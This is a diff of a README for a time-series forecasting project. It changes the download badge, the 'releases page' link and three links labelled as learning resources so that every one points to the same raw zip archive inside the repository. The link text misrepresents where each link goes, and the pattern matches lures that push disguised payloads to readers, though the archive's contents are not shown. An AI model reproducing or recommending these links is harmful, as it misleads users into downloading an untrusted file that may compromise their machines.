@@ -6,7 +6,7 @@ Welcome to **ts-panel-forecasting-baselines**! This application helps you foreca
 
 ## 📥 Download Now
 
-[![Download ts-panel-forecasting-baselines](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)
+[![Download ts-panel-forecasting-baselines](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)
 
 ## 🔍 Features
 
@@ -30,7 +30,7 @@ To use **ts-panel-forecasting-baselines**, you need:
 
 To get started, visit the releases page to download the latest version of the application. 
 
-[Visit this page to download](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)
+[Visit this page to download](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)
 
 1. **Access the Releases Page:** Click the link above to navigate to the releases section of the repository.
 2. **Select the Latest Version:** Look for the most recent release at the top of the page.
@@ -96,8 +96,8 @@ Explore these topics to enhance your understanding and capabilities in forecasti
 
 For deeper insights into the methodologies and algorithms used in this project, consider exploring the following:
 
-- [Python for Data Analysis](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)
-- [Time Series Forecasting in Python](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)
-- [Introduction to Jupyter Notebooks](https://raw.githubusercontent.com/lucario09/ts-panel-forecasting-baselines/main/serving/ts-panel-forecasting-baselines.zip)
+- [Python for Data Analysis](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)
+- [Time Series Forecasting in Python](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)
+- [Introduction to Jupyter Notebooks](https://github.com/lucario09/ts-panel-forecasting-baselines/raw/refs/heads/main/serving/ts_baselines_panel_forecasting_Dinobryon.zip)
 
 Happy forecasting!
